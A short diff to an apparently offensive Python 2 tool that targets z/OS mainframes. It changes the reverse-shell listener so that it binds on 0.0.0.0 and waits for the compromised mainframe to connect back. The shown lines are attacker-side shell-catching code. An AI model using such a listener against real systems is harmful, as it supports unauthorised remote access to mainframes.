@@ -666,7 +666,7 @@ if results.reverse:
                 print bcolors.BLUE + "[+] Connecting Reverse Shell - Waiting for z/OS!" + bcolors.ENDC                
                 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                server.bind((socket.gethostname(), int(results.lport))) 
+                server.bind(("0.0.0.0", int(results.lport)))
                 server.listen(1)
                 MFsock, address = server.accept()
         except Exception, e:
